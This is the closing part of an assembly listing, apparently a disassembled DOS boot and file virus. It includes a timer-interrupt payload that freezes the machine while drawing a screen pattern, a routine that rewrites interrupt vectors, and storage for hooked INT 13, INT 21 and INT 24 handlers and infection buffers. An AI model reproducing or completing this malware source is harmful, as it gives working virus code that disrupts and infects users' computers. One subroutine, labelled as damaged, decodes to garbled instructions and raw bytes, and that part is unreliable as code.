						;  set cursor mode in cx
		mov	al,8
		mov	dx,loc_911-boot+7C00h
		call	sub_27			; Set INT 08 vector
		mov	ax,7FEh
		out	21h,al			; port 21h, 8259-1 int comands
						;  al = 0FEh, IRQ0 (timer) only
		sti				; Enable interrupts
		xor	bx,bx			; Zero register
		mov	cx,1
loc_91: 	jmp	short loc_91		; SLEEP!!!
loc_911:	dec	cx			; INT 08 handler
		jnz	loc_92			; Jump if not zero
		xor	di,di			; Zero register
		inc	bx
		call	sub_25			; (0F67)
		call	sub_25			; (0F67)
		mov	cl,4
loc_92:
		mov	al,20h			; ' '
		out	20h,al			; port 20h, 8259-1 int command
						;  al = 20h, end of interrupt
		iret				; Interrupt return

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_25		proc	near
		mov	cx,28h

locloop_93:
		call	sub_26			; (0F93)
		stosw				; Store ax to es:[di]
		stosw				; Store ax to es:[di]
		loop	locloop_93		; Loop if cx > 0

add1:		add	di,9Eh	    ; sub di,9Eh
		mov	cx,17h

locloop_94:
		call	sub_26			; (0F93)
		stosw				; Store ax to es:[di]
add2:		add	di,9Eh	    ; sub di,9Eh
		loop	locloop_94		; Loop if cx > 0

setd:		std				; Set direction flag
_setd		equ	setd - boot + 7c00h
		xor	byte ptr ds:[_setd],1	; (CS:7CE7=0)
_add1		equ	add1 - boot + 7c01h
		xor	byte ptr ds:[_add1],28h ; (CS:7CD7=0) '('
_add2		equ	add2 - boot + 7c01h
		xor	byte ptr ds:[_add2],28h ; (CS:7CE2=0) '('
		retn
sub_25		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_26		proc	near
		and	bx,3
_data1		equ	data1 - boot + 7c00h
		mov	al,byte ptr ds:[_data1+bx]	 ; (CS:7C0A=0)
		inc	bx
		retn
sub_26		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_27		proc	near
		push	es
		push	bx
		xor	bx,bx			; Zero register
		mov	es,bx
		mov	bl,al
		shl	bx,1			; Shift w/zeros fill
		shl	bx,1			; Shift w/zeros fill
		mov	es:[bx],dx
		mov	es:[bx+2],ds
		pop	bx
		pop	es
		retn
sub_27		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;		      SUBROUTINE - *** DAMAGED BY STACK ***
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_28		proc	near
		call	sub_13			; (0CC6)
		mov	dl,1
		add	[bp+si-4F2h],bl
		pop	es
		jo	$+2			; Jump if overflow=1
		xor	cx,word ptr ds:[32Eh]	; (0000:032E=0)
		push	di
		sbb	[bp+di],al
		add	byte ptr ds:[0],ah	; (0000:0000=5Bh)
		add	[bx+di],ah
		add	[bx+si+12h],dl
		sbb	dx,[bx]
		loopnz	$+11h			; Loop if zf=0, cx>0
		jnp	$+23h			; Jump if not parity
		db	0C1h, 02h, 31h, 41h, 7Ah, 16h
		db	 01h, 1Fh, 9Ah, 0Eh,0FBh, 07h
		db	 70h, 00h, 33h, 0Eh, 2Eh, 03h
		db	 57h, 18h, 57h, 1Fh,0A9h, 80h
		db	 00h, 00h, 57h, 1Fh
sub_28		endp

		org	1200h

data_38 	dw	?
data_40 	dw	?
data_41 	dw	?, ?
data_42 	dw	?
data_43 	dw	?
data_44 	dw	?
data_45 	dw	?
data_46 	dw	?, ?
data_48 	dw	?
data_49 	dw	?
		db	12 dup (?)
prm_blck_adr	dw	?, ?
data_52 	db	?
data_53 	dw	?
data_54 	dw	?
old_INT 	dd	?
old_INT_1	dd	?
ptr_INT_21	dd	?
old_INT_13	dd	?
old_INT_24	dd	?
data_65 	dd	?
old_DS		dw	?
data_68 	dw	?
data_69 	dw	?
data_70 	db	?
data_71 	dw	?
data_72 	dw	?
data_73 	db	?
data_74 	db	?
data_75 	db	50h dup (?)
data_76 	db	?
data_77 	dw	?
data_78 	dw	?
data_79 	dw	?
data_80 	dw	?
data_81 	dw	?
data_82 	dw	?
data_83 	dw	?
data_84 	dw	?
data_85 	dw	?
data_86 	db	0Eh dup (?)
data_87 	dw	?
data_88 	dd	?
		db	?
data_89 	db	10h dup (?)
data_90 	db	?
data_91 	dw	?
data_92 	dw	?
data_93 	dw	?
data_94 	db	?
data_95 	db	?
old_AX		dw	?
data_97 	db	?
data_98 	dw	?
data_99 	dw	?
data_100	dw	?
data_101	dw	?
dos_ver 	db	?
data_103	db	?
data_104	db	?
exec_block	db	0Eh dup (?)
data_106	dw	?
data_107	dw	?
entry_point	dd	?
file_name	db	50h dup (?)
data_111	dw	?
data_112	dw	?
data_113	dw	?
data_114	dw	?

seg_a		ends

		end
